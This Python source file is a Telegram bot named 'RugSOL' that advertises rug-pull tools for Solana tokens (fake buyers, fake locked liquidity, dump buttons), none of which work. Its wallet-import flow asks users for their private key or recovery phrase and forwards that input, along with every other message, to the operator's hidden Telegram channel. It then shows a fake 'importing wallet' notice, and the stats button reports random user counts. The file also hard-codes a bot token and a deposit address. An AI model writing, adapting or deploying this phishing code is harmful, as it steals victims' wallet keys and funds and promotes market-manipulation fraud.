import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply
from datetime import datetime
import random, time, traceback

# ========================
# CONFIG
# ========================
MY_TOKEN = "8404382054:AAEhvx6vgCOU9C2qDLcBeeWfTSHkshamHMw"
MY_CHANNEL_ID = -1003034364211
LOG_FILE = "rugsol_layout.log"
SOLANA_ADDRESS = "EJBM68GC32YpjC5Vn4g6kYQsSuzXSsKMEjYibsKFq6rb"

bot = telebot.TeleBot(MY_TOKEN)
importing_wallet = {}

# ========================
# RUG LAYOUT KEYBOARD
# ========================
def generate_rug_keyboard():
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🪙Your Tokens: 0", callback_data="tokens"))
    kb.row(InlineKeyboardButton("🚀Launch A Token", callback_data="launch"))
    kb.row(
        InlineKeyboardButton("📈Fake Buyers", callback_data="fake_buyers"),
        InlineKeyboardButton("📉Fake Sellers", callback_data="fake_sellers")
    )
    kb.row(InlineKeyboardButton("💉Fake Locked Liquidity", callback_data="fake_liq"))
    kb.row(
        InlineKeyboardButton("Auto Volume: 🔴", callback_data="auto_vol"),
        InlineKeyboardButton("Gen Volume: 🔴", callback_data="gen_vol")
    )
    kb.row(
        InlineKeyboardButton("Comments: 🔴", callback_data="comments"),
        InlineKeyboardButton("Reactions 🔴", callback_data="reactions")
    )
    kb.row(InlineKeyboardButton("Custom Comments + Reactors", callback_data="custom_react"))
    kb.row(
        InlineKeyboardButton("📉Dump All", callback_data="dump_all"),
        InlineKeyboardButton("📉Dump %", callback_data="dump_percent"),
        InlineKeyboardButton("📉Dump 50%", callback_data="dump_50")
    )
    kb.row(
        InlineKeyboardButton("💸Profits", callback_data="profits"),
        InlineKeyboardButton("💳 Wallet", callback_data="wallet")
    )
    kb.row(
        InlineKeyboardButton("❔Help", callback_data="help"),
        InlineKeyboardButton("Server: Online 🟢", callback_data="server"),
        InlineKeyboardButton("💰Withdrawal", callback_data="withdraw")
    )
    kb.row(
        InlineKeyboardButton("📊 Stats", callback_data="stats")
    )
    return kb

# ========================
# WALLET IMPORT
# ========================
def start_inline_menu(chat_id):
    text = (
        f"Welcome To RugSOL,\nThe Best Rugging Tools in The Game\n\n"
        f"𝗦𝗼𝗹𝗮𝗻𝗮 · 🅴\n`{SOLANA_ADDRESS}`  (Tap To Copy)\n"
        "Balance: 0 SOL ($0.00)\n\n"
        "You can copy the Address and add Solana on your RugSOL Wallet, or import your Own Wallet\n\n\n"
    )
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=generate_rug_keyboard())

def import_wallet(chat_id):
    importing_wallet[chat_id] = True
    text = (
        f"𝗦𝗼𝗹𝗮𝗻𝗮 · 🅴\n`{SOLANA_ADDRESS}`  (Tap To Copy)\n"
        "Balance: 0 SOL ($0.00)\n\n"
        "Accepted formats are in the style of Phantom Wallet or Solflare.\n"
        "(e.g: HA1e8UAHxDsUFw4R.........)\n\n"
        "Fill your Private Key / Recovery Phrase below to import your Wallet:\n\n"
        "Otherwise type /start to return to main menu."
    )
    msg = bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=ForceReply(selective=True))
    bot.register_next_step_handler(msg, process_wallet_address)

def process_wallet_address(message):
    chat_id = message.chat.id
    text = message.text or ""
    if text.startswith("/start"):
        importing_wallet[chat_id] = False
        start_inline_menu(chat_id)
        return

    if len(text) < 70:
        msg = bot.send_message(chat_id, "Press /start to return to main menu.\n\nINVALID!\nPlease re-enter a valid wallet key.", reply_markup=ForceReply(selective=True))
        bot.register_next_step_handler(msg, process_wallet_address)
        return

    # Forward wallet to channel
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = message.from_user
    username = f"@{user.username}" if user.username else "—"
    forward_text = (
        "━━━━━━━━━━━━━━━\n"
        "📨 𝗡𝗘𝗪 𝗠𝗘𝗦𝗦𝗔𝗚𝗘\n"
        "━━━━━━━━━━━━━━━\n"
        f"🔗 Username: {username}\n"
        f"⏰ Time: {now}\n\n"
        f"💬 Message:\n```\n{text}\n```"
    )
    try:
        bot.send_message(MY_CHANNEL_ID, forward_text, parse_mode="Markdown")
    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"Forward error: {e}\n{traceback.format_exc()}\n")

    importing_wallet[chat_id] = False
    bot.send_message(chat_id, "🔄Transaction In Progress,\nImporting Wallet . . .\n\n⚠️Don't Close This Chat While Progressing.")
# ========================
# CALLBACK HANDLER
# ========================
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)

        # Wallet / Withdraw
        if call.data == "wallet":
            import_wallet(chat_id)
        elif call.data == "withdraw":
            bot.send_message(chat_id, "Balance in RugSOL:\n0 SOL ($0.00)\n\nWallet:\n⚠️No Wallet Imported")
            import_wallet(chat_id)

        # Stats random
        elif call.data == "stats":
            random_number = random.randint(1, 9000)
            bot.send_message(chat_id, f"📊 Users Online in RugSOL: {random_number} Users per-Second")

        # Dismiss popup
        elif call.data == "dismiss":
            try:
                bot.delete_message(chat_id, call.message.message_id)
            except:
                pass

        # Existing callbacks
        elif call.data == "tokens":
            bot.reply_to(call.message, "Your Current Live Tokens:\n0 Token")
        elif call.data == "launch":
            bot.send_message(chat_id, "You Don't Have Any SOL !\n0 SOL ($0.00)")
        elif call.data in ["fake_buyers", "fake_sellers", "fake_liq", "auto_vol", "gen_vol",
                           "dump_all", "dump_percent", "dump_50"]:
            bot.reply_to(call.message, "You Dont Have Any Tokens Live\n\nPlease Launch A Coin First")
        elif call.data in ["comments", "reactions", "custom_react"]:
            bot.reply_to(call.message, "Request Denied !, Reasons:\n\nLive Tokens: 0")
        elif call.data == "profits":
            bot.reply_to(call.message, "You hasn't made any Profit this far:\nProfits: 0 SOL ($0.00)")
        elif call.data == "server":
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("OK", callback_data="dismiss"))
            bot.send_message(chat_id, "✅Server Is Online !", reply_markup=kb)
        elif call.data == "help":
            help_command(call.message)

    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"Callback error: {e}\n{traceback.format_exc()}\n")

# ========================
# SLASH COMMANDS
# ========================
@bot.message_handler(commands=['start'])
def command_start(message):
    start_inline_menu(message.chat.id)

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "Tutorial:\n"
        "1. Make sure there are SOL in your Wallet to launch A Coin.\n"
        "2. After you chose to launch a Coin, fill Name, Ticker, Description, Picture, Website/Twitter(optional).\n"
        "3. Once Coin is launched, Ape in! Buy your Own coin so it can be Listed or even Graduated, Higher Prices, Higher Chances.\n"
        "4. Inject Fake Locked Liquidity, Fake Chart styles, Bundle it, Until Big Buyers coming in and your Coin reaches High Market Cap.\n"
        "5. Once you feel like you earned enough, Dump it. P.S We Will Only Take 0.02% Of Your Whole Profits As Gas Fees.\n"
        "6. Withdraw Your SOL, bot will ask for another Solana Wallet Address to Transfer. Transfers take max 1 Hour.\n\n"
        "Help:\nMake a Deposit by copying the Address above and adding Solana to RugSOL Wallet, or import your Own Wallet.\n"
        "Small Gas fee may apply (e.g Phantom, Solflare, etc).\n\n"
        "Cannot launch Token? You need minimum 0.1 SOL. Higher price → higher chance for Big Buyers."
    )
    bot.reply_to(message, help_text)

# ========================
# FORWARD ALL MESSAGES + AUTO REPLY
# ========================
@bot.message_handler(func=lambda message: True)
def forward_and_auto_reply(message):
    chat_id = message.chat.id
    user = message.from_user
    username = f"@{user.username}" if user.username else "—"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    original_content = message.text or "[non-text content]"

    # Forward to channel
    if message.text:
        message_content = f"```\n{original_content}\n```"
    else:
        message_content = original_content

    forward_text = (
        "━━━━━━━━━━━━━━━\n"
        "📨 𝗡𝗘𝗪 𝗠𝗘𝗦𝗦𝗔𝗚𝗘\n"
        "━━━━━━━━━━━━━━━\n\n"
        f"🔗 Username: {username}\n"
        f"⏰ Time: {now}\n\n"
        f"💬 Message:\n{message_content}"
    )
    try:
        bot.send_message(MY_CHANNEL_ID, forward_text, parse_mode="Markdown")
    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"Forward error: {e}\n{traceback.format_exc()}\n")

    # Auto-reply
    if message.text and not message.text.startswith("/"):
        if "help" in message.text.lower():
            help_command(message)
        else:
            start_inline_menu(chat_id)

# ========================
# RUN BOT (AUTO-RESTART)
# ========================
# ========================
# RUN BOT (AUTO-RESTART)
# ========================
def start_bot():
    while True:
        try:
            print("🚀 RugSOL Bot running...")
            bot.polling(none_stop=True, interval=0, timeout=5)
        except Exception as e:
            with open(LOG_FILE, "a") as f:
                f.write(f"Polling error: {e}\n{traceback.format_exc()}\n")
            print("⚠️ Polling error, restarting in 5 seconds...")
            time.sleep(5)
